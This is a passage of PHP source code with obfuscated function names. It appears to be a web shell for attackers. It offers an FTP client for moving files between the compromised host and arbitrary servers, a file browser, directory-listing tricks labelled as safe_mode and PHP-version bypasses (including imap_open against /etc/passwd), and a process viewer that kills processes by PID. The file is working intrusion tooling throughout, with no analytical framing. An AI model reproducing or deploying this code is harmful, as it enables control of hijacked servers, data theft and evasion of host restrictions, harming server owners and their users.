                case "upload":
                    if (@isset($lt) && !@empty($lt) && z4r($lt)) {
                        $ftp->putObject($lt, z1k($ftp_current_dir));
                    } elseif (@count($ltarr) > 0) {
                        foreach ($ltarr as $lto) {
                            $lto = @trim($lto);
                            if (!@empty($lto) && z4r($lto)) {
                                $ftp->putObject($lto, z1k($ftp_current_dir));
                            }
                        }
                    }
                    break;
                case "download":
                    if (@isset($rt) && !@empty($rt)) {
                        $ftp->getObject(z1k($ftp_current_dir) . $rt, $d);
                    } elseif (@count($rtarr) > 0) {
                        foreach ($rtarr as $rto) {
                            $rto = @trim($rto);
                            if (!@empty($rto)) {
                                $ftp->getObject(z1k($ftp_current_dir) . $rto, $d);
                            }
                        }
                    }
                    break;
                default:
                    break;
            }
        }
        $frml = z9y("194") . z9x() . z5x(array('act' => 'ftp', 'd', 'lmkdir' => '1'),
            z6u('ldir', '', '2') . z8b(z9y("195"), '7'));
        $frmf = z9y("194") . z9x() . z5x(array('act' => 'ftp', 'd', 'fmkdir' => '1'),
            z6u('fdir', '', '2') . z8b(z9y("195"), '7'));
        echo z3q(array(z10w(z7u(z7k(z9y("192")) . z6z($frml)), '2'), z10w(z7u(z7k(z9y("193") .
                z9x() . $hmsg) . z6z($frmf)), '2')), '4');
        $listf = $ftp->ftpRawList();
        $listl = z8x($d);
        $lsl = array();
        $lsl["d"] = array();
        $lsl["l"] = array();
        $lsl["f"] = array();
        $lsf = array();
        $lsf["d"] = array();
        $lsf["l"] = array();
        $lsf["f"] = array();
        if (@is_array($listl) && @count($listl) > 0) {
            foreach ($listl as $lf) {
                $fn = z2l($lf);
                if ($fn != '.' && $fn != '..') {
                    if (z4j($lf)) {
                        $lsl["d"][] = array($lf, 'DIR');
                    } elseif (z4q($lf)) {
                        $lsl["l"][] = array($lf, 'LINK');
                    } else {
                        $lsl["f"][] = array($lf, (@filesize($lf) !== false ? @filesize($lf) : 'FILE'));
                    }
                }
            }
        }
        if (@is_array($listf) && @count($listf) > 0) {
            foreach ($listf as $rf) {
                if ($rf[1] != '.' && $rf[1] != '..') {
                    if ($rf[0] == 'd') {
                        $lsf["d"][] = array($rf[1], 'DIR');
                    } elseif ($rf[0] == 'l') {
                        $rfd = (@strstr($rf[1], ' -> ') ? @substr($rf[1], 0, @strpos($rf[1], ' -> ')) :
                            $rf[1]);
                        $lsf['l'][] = array($rfd, 'LINK');
                    } else {
                        $lsf['f'][] = array($rf[1], $rf[2]);
                    }
                }
            }
        }
        if (!@isset($flsort)) {
            if (@isset($_SESSION['flsort'])) {
                $flsort = $_SESSION['flsort'];
            } else {
                $flsort = '0a';
            }
        }
        $_SESSION['flsort'] = $flsort;
        $pflsort = z5r($flsort);
        if ($pflsort[1] != 'a')
            $pflsort[1] = 'd';
        $v = $pflsort[0];
        @usort($lsl["d"], "z2b");
        @usort($lsl["l"], "z2b");
        @usort($lsl["f"], "z2b");
        if ($pflsort[1] == "d") {
            $lsl["d"] = @array_reverse($lsl["d"]);
            $lsl["l"] = @array_reverse($lsl["l"]);
            $lsl["f"] = @array_reverse($lsl["f"]);
        }
        if (!@isset($ffsort)) {
            if (@isset($_SESSION['ffsort'])) {
                $ffsort = $_SESSION['ffsort'];
            } else {
                $ffsort = '0a';
            }
        }
        $_SESSION['ffsort'] = $ffsort;
        $pffsort = z5r($ffsort);
        $ffsort = $pffsort[0] . $pffsort[1];
        if ($pffsort[1] != 'a')
            $pffsort[1] = 'd';
        $v = $pffsort[0];
        @usort($lsf["d"], "z2b");
        @usort($lsf["l"], "z2b");
        @usort($lsf["f"], "z2b");
        if ($pffsort[1] == "d") {
            $lsf["d"] = @array_reverse($lsf["d"]);
            $lsf["l"] = @array_reverse($lsf["l"]);
            $lsf["f"] = @array_reverse($lsf["f"]);
        }
        $list_l = array();
        $list_f = array();
        $list_l[] = array($d . '..', 'LINK');
        $list_f[] = array('..', 'LINK');
        foreach ($lsl["d"] as $lf)
            $list_l[] = $lf;
        foreach ($lsl["l"] as $lf)
            $list_l[] = $lf;
        foreach ($lsl["f"] as $lf)
            $list_l[] = $lf;
        foreach ($lsf["d"] as $rf)
            $list_f[] = $rf;
        foreach ($lsf["l"] as $rf)
            $list_f[] = $rf;
        foreach ($lsf["f"] as $rf)
            $list_f[] = $rf;
        $cl = @count($list_l);
        $cf = @count($list_f);
        echo z9m('2') . z6f() . z7j('', '4');
        z8n('l');
        echo z7f() . z7j('', '46');
        z8n('f');
        echo z7f() . z7y() . z10q();
        echo z9m('2') . z7o() . z7j('', '4') . z5z('', "1") . z9m('2');
        echo z7u(z7k(z5x(array('act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '0' ?
                '0' . ($pflsort[1] == "a" ? "d" : "a") : '0' . $pflsort[1])), z8b(z9y("57") . ($pflsort[0] ==
            '0' ? ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') .
            z6z(z5x(array('act', 'd', 'ffsort', 'flsort' => ($pflsort[0] == '1' ? '1' . ($pflsort[1] ==
                "a" ? "d" : "a") : '1' . $pflsort[1])), z8b(z9y("58") . ($pflsort[0] == '1' ?
            ' ' . ($pflsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7k(z9y
            ("62"), '8', '3'));
        for ($i = 0; $i < $cl; $i++) {
            $disp = z2l($list_l[$i][0]);
            if ((!@is_numeric($list_l[$i][1]) && $list_l[$i][1] == 'DIR') || $disp == '..') {
                $o = z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd' => $list_l[$i][0]), z8h('small_dir',
                    '', '9') . z8b(z8o($disp, 40), '10', z3g($disp, 'd')));
            } else {
                $ext = z2l($list_l[$i][0], '.');
                $o = z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'upload', 'lt' =>
                        $list_l[$i][0]), z8h($ext, '', '9') . z8b(z8o($disp, 40), '11', z3g($disp, 'f')));
            }
            echo z7u(z7k($o, '19', '2') . z6z((@is_numeric($list_l[$i][1]) ? z7x($list_l[$i][1]) :
                $list_l[$i][1]), '10') . z7k(($disp == '..' ? z0w($list_l[$i][0]) : z0t($list_l[$i][0]) .
                z4n($list_l[$i][0], 'idloc', ($i % 2 ? 'tra' : 'trb') . $jsid)), '10'), ($i % 2 ?
                '0' : '1'), ($i % 2 ? 'tra' : 'trb') . $jsid);
            $jsid++;
        }
        echo z10q() . z5h() . z7f() . z7j('', '46') . z5z('', "1") . z9m('2');
        echo z7u(z7k(z5x(array('act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '0' ?
                '0' . ($pffsort[1] == "a" ? "d" : "a") : '0' . $pffsort[1])), z8b(z9y("57") . ($pffsort[0] ==
            '0' ? ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '2') .
            z6z(z5x(array('act', 'd', 'flsort', 'ffsort' => ($pffsort[0] == '1' ? '1' . ($pffsort[1] ==
                "a" ? "d" : "a") : '1' . $pffsort[1])), z8b(z9y("58") . ($pffsort[0] == '1' ?
            ' ' . ($pffsort[1] == "a" ? '&uarr;' : '&darr;') : ''), '3')), '8', '') . z7k(z9y
            ("62"), '8', '3'));
        for ($i = 0; $i < $cf; $i++) {
            $disp = z2l($list_f[$i][0]);
            if ((!@is_numeric($list_f[$i][1]) && $list_f[$i][1] == "DIR") || $disp == '..') {
                $o = z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'rd' => $list_f[$i][0]),
                    z8h('small_dir', '', '9') . z8b(z8o($disp, 40), '10', z3g($disp, 'd')));
            } else {
                $ext = z2l($list_f[$i][0], '.');
                $o = z5x(array('act' => 'ftp', 'flsort', 'ffsort', 'd', 'ft' => 'download', 'rt' =>
                        $list_f[$i][0]), z8h($ext, '', '9') . z8b(z8o($disp, 40), '11', z3g($disp, 'f')));
            }
            echo z7u(z7k($o, '19', '2') . z6z((@is_numeric($list_f[$i][1]) ? z7x($list_f[$i][1]) :
                $list_f[$i][1]), '10') . z7k(($disp == '..' ? z0q($list_f[$i][0]) : z0r($list_f[$i][0]) .
                z4n($list_f[$i][0], 'idftp', ($i % 2 ? 'tra' : 'trb') . $jsid)), '10'), ($i % 2 ?
                '0' : '1'), ($i % 2 ? 'tra' : 'trb') . $jsid);
            $jsid++;
        }
        echo z10q() . z5h() . z7f() . z7y() . z10q();
        echo z9m('2') . z7o() . z7j('', '4') . z0s('idloc', 'ltall', z9v('act') . z9v('flsort') .
            z9v('ffsort') . z9v('d') . z9v('ftpmloc', '1'), array('' => z9y("66"), 'upload' =>
                z9y("197"), 'delete' => z9y("199"))) . z7f() . z7j('', '4') . z0s('idftp',
            'rtall', z9v('act') . z9v('flsort') . z9v('ffsort') . z9v('d') . z9v('ftpmrem',
            '1'), array('' => z9y("66"), 'download' => z9y("198"), 'delete' => z9y("199"))) .
            z7f() . z7y() . z10q();
    } else {
        echo z3q(z9y("185") . z9x() . ($hmsg != '' ? ' : ' . $hmsg : ''));
        echo z6s() . z10w(z7u(z5x(array("act" => "ftp", "d"), z6l(z7n(z9y("186")) . z6u
            ("ftp_server", $ftp_server, '5') . z6u("ftp_port", $ftp_port, '6')) . z6l(z7n(z9y
            ("187")) . z6u("ftp_username", $ftp_username, '5')) . z6l(z7n(z9y("188")) . z6u
            ("ftp_password", $ftp_password, '5') . z8b(z9y("189"), '7') . ' ' . z5u("ftp_passive1",
            z9y("190"), "ftp_passive")))), '2') . z6s();
        $dmsg = $umsg = '';
        if (!@empty($ftp_server) && !@empty($ftp_port) && !@empty($ftp_username) && !@
            empty($ftp_password) && @isset($ftp_quickaction)) {
            $ftp = new ftp($ftp_server, $ftp_port, $ftp_username, $ftp_password, $ftp_passive);
            if ($ftp->loggedOn) {
                if ($ftp_quickaction == "upload") {
                    $umsg = ($ftp->put($ftp_remotefile, $ftp_localfile) ? z9y("208") : z9y("209"));
                } elseif ($ftp_quickaction == "download") {
                    $dmsg = ($ftp->get($ftp_remotefile, $ftp_localfile, 1) ? z9y("210") : z9y("211"));
                }
            } else {
                if ($ftp_quickaction == "upload") {
                    $umsg = z9y("191");
                } else {
                    $dmsg = z9y("191");
                }
            }
        }
        echo z3q(array(z9y("200") . z9x() . ($dmsg != '' ? " : " . $dmsg : ''), z9y("201") .
                z9x() . ($umsg != '' ? " : " . $umsg : '')), '46');
        echo z10w(z9d(z9c(z5x(array('act' => 'ftp', 'ftp_quickaction' => 'download', 'd'),
            z10w(z5b() . z7u(z5t(z9y("202")) . z9c(z6u('ftp_server', $ftp_server, '2') . z6u
            ('ftp_port', $ftp_port, '6'))) . z7u(z5t(z9y("203")) . z9c(z6u('ftp_username', $ftp_username,
            '4') . z6u('ftp_password', $ftp_password, '5'))) . z7u(z5t(z9y("204")) . z9c(z6u
            ('ftp_remotefile', $ftp_remotefile, '0'))) . z7u(z5t(z9y("205")) . z9c(z6u('ftp_localfile',
            $ftp_localfile, '0'))) . z7u(z5t('') . z9c(z8b(z9y("207"), '7') . z5u("ftp_passive2",
            z9y("190"), "ftp_passive"))) . z5b())), '', '4') . z9c(z5x(array('act' => 'ftp',
                'ftp_quickaction' => 'upload', 'd'), z10w(z5b() . z7u(z5t(z9y("202")) . z9c(z6u
            ('ftp_server', $ftp_server, '2') . z6u('ftp_port', $ftp_port, '6'))) . z7u(z5t(z9y
            ("203")) . z9c(z6u('ftp_username', $ftp_username, '4') . z6u('ftp_password', $ftp_password,
            '5'))) . z7u(z5t(z9y("205")) . z9c(z6u('ftp_localfile', $ftp_localfile, '0'))) .
            z7u(z5t(z9y("204")) . z9c(z6u('ftp_remotefile', $ftp_remotefile, '0'))) . z7u(z5t
            ('') . z9c(z8b(z9y("206"), '7') . z5u("ftp_passive3", z9y("190"), "ftp_passive"))) .
            z5b())), '', '46')), '2');
    }
}
if ($act == 'ls') {
    if (!@isset($sort)) {
        if (@isset($_SESSION['sort'])) {
            $sort = $_SESSION['sort'];
        } else {
            $sort = z7z('3', 'default_sort');
        }
    }
    $_SESSION['sort'] = $sort;
    if (!@isset($ftarget))
        $ftarget = '';
    if (!@isset($fullpath))
        $fullpath = 0;
    if (!@isset($with_ls))
        $with_ls = 0;
    if (@isset($ls_a) && @count($ls_a) > 0) {
        $list = $ls_a;
    } else {
        $list = z8x($d);
        $showbuf = 0;
    }
    $ugstat = 0;
    $jsid = 0;
    if (z7e('posix_getpwuid') && z7e('posix_getgrgid') && z7e('fileowner') && z7e('filegroup'))
        $ugstat = 1;
    if (!@isset($nolsmenu) || !$nolsmenu) {
        z2n();
        if (z1y($d))
            z4i();
    }
    z5o();
    if (@count($list) > 0) {
        $obj = array();
        $inf = array();
        $obj["h"] = array();
        $obj["d"] = array();
        $obj["l"] = array();
        $obj["f"] = array();
        foreach ($list as $v) {
            $o = z2l($v);
            $t = 'f';
            $t2 = 'd';
            if (($o == ".") || ($o == "..")) {
                $t = 'd';
            } elseif (@z4j($v)) {
                $t = 'd';
                if (z4q($v)) {
                    $t2 = 'l';
                }
            } elseif (@z4q($v)) {
                $t = 'l';
            }
            if ($t == 'f') {
                if (z5i($v))
                    $t = 'e';
            } elseif ($t == 'l') {
                if (z5i($v))
                    $t2 = 'e';
            }
            if (@isset($filter) && !z1q($v, $filter, $t))
                continue;
            if ($with_ls) {
                $inf[$v] = z4s($v, $t);
            } else {
                $fileperms = @fileperms($v);
                if (!$fileperms && $nix && $sh_exec) {
                    $inf[$v] = z4s($v, $t);
                }
            }
            $row = array();
            if ($o == ".") {
                $row[] = $d . $o;
                $row[] = "LINK";
            } elseif ($o == "..") {
                $row[] = $d . $o;
                $row[] = "LINK";
            } elseif ($t == 'd') {
                $row[] = $v;
                $row[] = (($t2 == 'l') ? "LINK" : "DIR");
            } elseif ($t == 'f' || $t == 'e' || $t == 'l') {
                $row[] = $v;
                $row[] = (@isset($inf[$v]) ? $inf[$v][1] : @filesize($v));
            }
            $row[] = (@isset($inf[$v]) ? $inf[$v][2] : @filemtime($v));
            if ($nix) {
                if (@isset($inf[$v])) {
                    $row[] = $inf[$v][3];
                } else {
                    if ($ugstat) {
                        $ow = @posix_getpwuid(@fileowner($v));
                        $gr = @posix_getgrgid(@filegroup($v));
                        $row[] = array(($ow["name"] ? $ow["name"] : @fileowner($v)), ($gr["name"] ? $gr["name"] :
                                @filegroup($v)));
                    } else {
                        $row[] = array('unk', 'unk');
                    }
                }
            }
            $row[] = (@isset($inf[$v]) ? $inf[$v][4] : $fileperms);
            $row[] = $t;
            $row[] = $t2;
            if (($o == ".") || ($o == "..")) {
                if ($o == '..')
                    $obj["h"][] = $row;
            } elseif ($t == 'l') {
                $obj["l"][] = $row;
            } elseif ($t == 'd') {
                $obj["d"][] = $row;
            } elseif ($t == 'f' || $t == 'e') {
                $obj["f"][] = $row;
            }
        }
        $row = array();
        $row[] = z9y("57");
        $row[] = z9y("58");
        $row[] = z9y("59");
        if (!$win) {
            $row[] = z9y("60");
        }
        $row[] = z9y("61");
        $row[] = z9y("62");
        $psort = z5r($sort);
        if ($psort[1] != 'a') {
            $psort[1] = 'd';
        } else {
            $psort[1] = 'a';
        }
        if (!@isset($nohead) || !$nohead) {
            for ($i = 0; $i < @count($row) - 1; $i++) {
                $row[$i] = z5x(array('act', 'd', 'filter', 'sort' => ($i == $psort[0] ? $i . ($psort[1] ==
                        "a" ? "d" : "a") : $i . $psort[1])), z8b($row[$i] . ($i == $psort[0] ? ' ' . ($psort[1] ==
                    "a" ? '&uarr;' : '&darr;') : ''), '3', ($i == "1" ?
                    ' style="text-align: right;"' : '')));
            }
        }
        $v = $psort[0];
        @usort($obj["d"], "z2b");
        @usort($obj["l"], "z2b");
        @usort($obj["f"], "z2b");
        if ($psort[1] == "d") {
            $obj["d"] = @array_reverse($obj["d"]);
            $obj["l"] = @array_reverse($obj["l"]);
            $obj["f"] = @array_reverse($obj["f"]);
        }
        $obj = @array_merge($obj["h"], $obj["d"], $obj["l"], $obj["f"]);
        $tab = array();
        $tab["c"] = array($row);
        $tab["h"] = array();
        $tab["d"] = array();
        $tab["l"] = array();
        $tab["f"] = array();
        $i = 0;
        foreach ($obj as $a) {
            if (@is_array($a) && @count($a) >= 6) {
                $v = $a[0];
                $t = $a[(@count($a) - 2)];
                $t2 = $a[(@count($a) - 1)];
                $o = z2l($v);
                $dir = z3a($v);
                if ($fullpath) {
                    if (@substr($v, 0, @strlen($d)) == $d) {
                        $disp = @substr($v, @strlen($d));
                    } else {
                        $disp = $v;
                    }
                } else {
                    $disp = $o;
                }
                $disp = z8o($disp, 60);
                $row = array();
                if ($o == ".") {
                    $row[] = z5x(array('act' => 'ls', 'd' => $v), z8h('small_dir', '', '9') . z8b($disp,
                        '10'), $ftarget);
                    $row[] = "LINK";
                } elseif ($o == "..") {
                    $row[] = z5x(array('act' => 'ls', 'd' => $v), z8h('small_dir', '', '9') . z8b($disp,
                        '10'), $ftarget);
                    $row[] = "LINK";
                } elseif ($t == 'd') {
                    if ($t2 == 'l') {
                        if (@readlink($v))
                            $disp .= " => " . @readlink($v);
                        $type = "LINK";
                        $row[] = z5x(array('act' => 'ls', 'd' => $v), z8h('small_dir', '', '9') . z8b($disp,
                            '10', z3g($o, 'd')), $ftarget);
                    } else {
                        $type = "DIR";
                        $row[] = z5x(array('act' => 'ls', 'd' => $v), z8h('small_dir', '', '9') . z8b($disp,
                            '10', z3g($o, 'd')), $ftarget);
                    }
                    $row[] = $type;
                } elseif ($t == 'f' || $t == 'e' || $t == 'l') {
                    $ext = @strtolower(z2l($v, '.'));
                    $row[] = z5x(array('act' => 'f', 'd' => $dir, 'f' => $o), z8h($ext, '', '9', (($t ==
                        'e' || $t2 == 'e') ? '1' : '')) . z8b($disp, '11', z3g($o, 'f')), $ftarget);
                    $row[] = (@isset($inf[$v]) ? $a[1] : z7x($a[1]));
                }
                $row[] = (@isset($inf[$v]) ? $a[2] : @date("Y.m.d H:i", $a[2]));
                if ($nix) {
                    $row[] = $a[3][0] . "/" . $a[3][1];
                }
                $row[] = z6t((@isset($inf[$v]) ? $a[4] : z9w(@fileperms($v))), z6g($v));
                if ($t == 'd' && $o != '..') {
                    $row[] = z1r($v, ($ftarget ? '1' : '')) . z4n($v, 'ls', 'replacejsid' . $jsid);
                    $jsid++;
                } else {
                    if ($o != '.' && $o != '..') {
                        $row[] = z0o($v, $ftarget) . z4n($v, 'ls', 'replacejsid' . $jsid);
                        $jsid++;
                    } else {
                        $row[] = z0z($v, $ftarget);
                    }
                }
                if (($o == '.') || ($o == '..')) {
                    if ($o == '..')
                        $tab["h"][] = $row;
                } elseif ($t == 'l') {
                    $tab["l"][] = $row;
                } elseif ($t == 'd') {
                    $tab["d"][] = $row;
                } elseif ($t == 'f' || $t == 'e') {
                    $tab["f"][] = $row;
                }
                $i++;
            }
        }
        $table = @array_merge($tab["c"], $tab["h"], $tab["d"], $tab["l"], $tab["f"]);
        $trid = 0;
        if (@count($table) > 0) {
            echo z9m('2') . z7o() . z7j('', '4') . z5z('', "2");
            echo z9m('2');
            $cnt = 0;
            foreach ($table as $row) {
                $r = '';
                $cnt2 = 0;
                foreach ($row as $v) {
                    if ($cnt == 0) {
                        $r .= (($cnt2 == 0) ? z9c($v, '7', "2") : (($cnt2 == 1) ? z6z($v, '8') : ($cnt2 ==
                            (@count($row) - 1) ? z9c($v, '8', '3') : z9c($v, '8'))));
                    } else {
                        $r .= (($cnt2 == 0) ? z9c($v, '9') : (($cnt2 == 1) ? z6z($v, '10') : z9c($v,
                            '10')));
                    }
                    $cnt2++;
                }
                $trids = '';
                if (@strpos($r, 'id="replacejsid') !== false) {
                    $trids = "tr" . ($cnt % 2 ? 'a' : 'b');
                    $r = @str_replace('id="replacejsid', 'id="' . $trids, $r);
                    $trids .= $trid;
                    $trid++;
                }
                echo z7u($r, ($cnt % 2 ? '0' : '1'), $trids);
                $cnt++;
            }
            echo z10q();
            echo z5h() . z7f() . z7y() . z10q();
            $arr_select = array('' => z9y("66"));
            if (@isset($use_buffer) && $use_buffer && (!@isset($nolsmenu) || !$nolsmenu)) {
                $arr_select["bcopy"] = z9y("67");
                $arr_select["bcut"] = z9y("68");
                $ucopy = $ucut = 0;
                if (@isset($bcopy) && @is_array($bcopy) && @count($bcopy) > 0) {
                    $arr_select["bunsetcopy"] = z9y("69");
                    $ucopy = 1;
                }
                if (@isset($bcut) && @is_array($bcut) && @count($bcut) > 0) {
                    $arr_select["bunsetcut"] = z9y("70");
                    $ucut = 1;
                }
                if ($ucopy && $ucut)
                    $arr_select["bunsetall"] = z9y("71");
            }
            $arr_select["delete"] = z9y("72");
            echo z0s('ls', 'lsall', z9v('act') . z9v('d'), $arr_select);
        }
    } else {
        if (z7e('imap_open') && z7e('imap_list') && @version_compare(@phpversion(),
            "5.2.0") <= 0)
            $sls_arr["imap"] = "imap_list (safe_mode / PHP <= 5.1.2)";
        if (z7e('glob'))
            $sls_arr["glob"] = "glob (PHP <= 5.2.x + some others)";
        if (z7e('realpath'))
            $sls_arr["realpath"] = "realpath (PHP <= 5.2.4 + some others)";
        if (@isset($sls_arr["glob"]) && !@isset($submit1) && !@isset($listdir_func)) {
            $submit1 = 1;
            $listdir_func = "glob";
        } elseif (@isset($sls_arr["realpath"]) && !@isset($submit1) && !@isset($listdir_func)) {
            $submit1 = 1;
            $listdir_func = "realpath";
        }
        if (@count($sls_arr) > 0) {
            echo z3q(z9y("125"));
            echo z6s();
            echo z9m("2") . z6f() . z6q();
            echo z5w('', "1");
            if (@isset($submit1) && $submit1) {
                switch ($listdir_func) {
                    case 'imap':
                        $stream = @imap_open('/etc/passwd', "", "");
                        $dir_list = @imap_list($stream, @trim($d), "*");
                        for ($i = 0; $i < @count($dir_list); $i++)
                            echo @htmlspecialchars($dir_list[$i]) . "\r\n";
                        @imap_close($stream);
                        break;
                    case 'glob':
                        z3w($d);
                        break;
                    case 'realpath':
                        z3y($d);
                        break;
                }
            }
            echo z5q();
            echo z7f() . z7y() . z10q();
            echo z10w(z7u(z6l(z5z("left", "3") . z5x(array("act", "submit1" => "1"), z10w(z7u
                (z9c(z7n(z9y("126")) . z5y("d", $d, "0", "", "9") . z3m("listdir_func", $sls_arr,
                "5", 1) . z8b(z9y("127"), "7"))), "2")) . z5h())), "2");
            echo z6s();
        } else {
            echo z3q(z9y("464", $d));
        }
    }
}
if ($act == 'processes') {
    if (!@isset($sortp))
        $sortp = ($nix ? '1a' : '0a');
    $header = '';
    if ($nix) {
        $h = 'ps -aux' . ((@isset($grep) && $grep) ? '|grep "' . $grep .
            '"|grep -v grep' : '');
        if (@isset($pid) && $pid) {
            if (!@isset($sig) || @is_null($sig)) {
                $sig = 9;
            }
            $header = " : " . z9y("349", array($sig, $pid)) . (@posix_kill($pid, $sig) ? z9y
                ("350") : z9y("351"));
        }
    } else {
        $h = 'tasklist';
    }
    $r = z9e($h);
    echo z3q(z9y("348") . $header, '1');
    if ($r) {
        $r = z2v('  ', ' ', $r);
        $ppsort = z5r($sortp);
        if ($ppsort[1] != 'a') {
            $ppsort[1] = 'd';
        } else {
            $ppsort[1] = 'a';
        }
        if ($nix) {
            $stack = @explode("\n", $r);
            $head = @explode(' ', $stack[0]);
            if (!@isset($grep) || !$grep) {
                unset($stack[0]);
            }
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5x(array('act', 'd', 'pfilter', 'sortp' => $i . $ppsort[1]), z8b($head[$i],
                        '3'));
                } else {
                    $head[$i] = z5x(array('act', 'd', 'pfilter', 'sortp' => $ppsort[0] . ($ppsort[1] ==
                            'a' ? 'd' : 'a')), z8b($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' :
                        '&darr;'), '3'));
                }
            }
            $head[] = z9y("62");
            $prcs = array();
            if (!@isset($pfilter) || @empty($pfilter) || $pfilter == '---') {
                $bool = 0;
                $pfilter = '';
            } else {
                $bool = 1;
            }
            foreach ($stack as $line) {
                if (!@empty($line)) {
                    $line = @explode(" ", $line);
                    if (($bool && $pfilter == $line[0]) || !$bool) {
                        $line[0] = z5x(array('act' => 'processes', 'd', 'sortp', 'pfilter' => (($bool &&
                                $pfilter == $line[0]) ? '---' : $line[0])), z8b($line[0], '1', (($line[0] == $cuser) ?
                            ' style="color:' . z9q("okcolor") . ';"' : '')));
                        $line[10] = @join(" ", @array_slice($line, 10));
                        $line = @array_slice($line, 0, 11);
                        $line[] = z5x(array('act' => 'processes', 'd', 'sortp', 'pfilter', 'pid' => $line[1],
                                'sig' => '9'), z8b(z9y("392"), "7"));
                        $prcs[] = $line;
                    }
                }
            }
        } else {
            $r = @convert_cyr_string($r, "d", "w");
            $stack = @explode("\n", $r);
            unset($stack[0], $stack[2]);
            $stack = @array_values($stack);
            $stack = @array_slice($stack, 1);
            $head[0] = "PROGRAM";
            $head[1] = "PID";
            if ($ppsort[0] >= @count($head)) {
                $ppsort[0] = @count($head) - 1;
            }
            for ($i = 0; $i < @count($head); $i++) {
                if ($i != $ppsort[0]) {
                    $head[$i] = z5x(array('act', 'd', 'sortp' => $i . $ppsort[1]), z8b($head[$i],
                        '3'));
                } else {
                    $head[$i] = z5x(array('act', 'd', 'sortp' => $ppsort[0] . ($ppsort[1] == 'a' ?
                            'd' : 'a')), z8b($head[$ppsort[0]] . ' ' . ($ppsort[1] == 'a' ? '&uarr;' :
                        '&darr;'), '3'));
                }
            }
            $prcs = array();
            foreach ($stack as $line) {
                if (!@empty($line)) {
                    $ln = @explode(" ", $line);
                    if (@count($ln) >= 2)
                        $prcs[] = array($ln[0], $ln[1]);
                }
            }
        }
        $v = $ppsort[0];
        @usort($prcs, "z2b");
        if ($ppsort[1] == "d") {
            $prcs = @array_reverse($prcs);
        }
        $tab = array();
        if (!@isset($grep) || !$grep) {
            $tab[] = $head;
        }
        $tab = @array_merge($tab, $prcs);
        echo z9m('2');
        $cnt = 0;
        foreach ($tab as $i => $k) {
            $r = '';
            $cnt2 = 0;
            foreach ($k as $j => $v) {
                if ($win and $i > 0 and $j == 2) {
                    $v = z7x($v);
                }
                if ($cnt == 0) {
                    $r .= (($cnt2 == 0) ? z7k($v, '13', '2') : ($cnt2 == (@count($k) - 1) ? z7k($v,
                        '13', '3') : z7k($v, '13')));
                } else {
                    $r .= (($cnt2 == 0) ? z7k($v, '14', '2') : ($cnt2 == (@count($k) - 1) ? z7k($v,
                        '14', '3') : z7k($v, '14')));
                }
                $cnt2++;
            }
            echo z7u($r, ($cnt % 2 ? '0' : '1'));
            $cnt++;
        }
        echo z10q();
    }
}
z3j(); ?>